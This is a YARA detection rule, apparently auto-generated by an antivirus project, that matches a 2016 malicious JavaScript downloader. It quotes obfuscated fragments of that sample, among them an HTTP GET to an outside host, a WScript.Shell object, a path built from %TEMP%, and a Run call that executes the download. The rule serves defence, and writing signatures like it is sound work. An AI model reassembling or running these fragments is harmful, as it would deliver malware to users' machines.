rule sig_20160427_f99a0da5e9a5231e1e5be30066e3f854 {
  meta:
    description = "datamaliciousorder - file 20160427_f99a0da5e9a5231e1e5be30066e3f854.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "64a573f96cbe3f9a8127b04e85e8510cd0c4d9e37423e85078a6fe09325900d0"

  strings:
    $s1  = "YdznbOcfzw[EdiohXxwbg](\"G\" + \"ET\", \"http://myehelpers.com/j3ykf\", false);" fullword ascii
    $s2  = "function MoxnjSbjys() {return MlaaxRmdzq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"cP77JBk" ascii
    $s3  = "function MoxnjSbjys() {return MlaaxRmdzq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"cP77JBk" ascii
    $s4  = "var MlaaxRmdzq = function PispoHnlsf() {return YclcdVggyi[XdhqcLhari](\"WScript\"+\".Shell\");}(), FfnezVxxnq = 11;" fullword ascii
    $s5  = "function FeuaxOitzk(JtygrUcvop, GfrbvFjysm){CqejzFbgpg = CqejzFbgpg * 1; return JtygrUcvop - GfrbvFjysm;};" fullword ascii
    $s6  = "var YclcdVggyi = this[\"WScript\"];" fullword ascii
    $s7  = "if (YdznbOcfzw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function LuduiOrutr(){return XqliyAfdgh + \"\";};" fullword ascii
    $s9  = "function CwfgvPiywz() {return ((GthghHaagc == true) && (GthghHaagc == FnobwYsnxh)) ? 1 : CqejzFbgpg;};" fullword ascii
    $s10 = "function PfmklZigvj(){return 23;};" fullword ascii
    $s11 = "var HmuezOwfqf = false;" fullword ascii
    $s12 = "function SkvxaAuxbj(){return XdhqcLhari;};" fullword ascii
    $s13 = "var GthghHaagc = false;" fullword ascii
    $s14 = "function VzfkdGkehw(KiipwEwjkd) {var QgeymSjlwn = (1, 2, 3, 4, 5, KiipwEwjkd); return QgeymSjlwn;};" fullword ascii
    $s15 = "GthghHaagc = true; " fullword ascii
    $s16 = "FnobwYsnxh = true; " fullword ascii
    $s17 = "var EhduqBacgn = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function BqxbmHdrod(TaxwoUfgsa){MlaaxRmdzq[\"R\"+\"un\"](TaxwoUfgsa, CqejzFbgpg, CqejzFbgpg);};" fullword ascii
    $s19 = "function IokbpBnfvu()" fullword ascii
    $s20 = "HmuezOwfqf = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}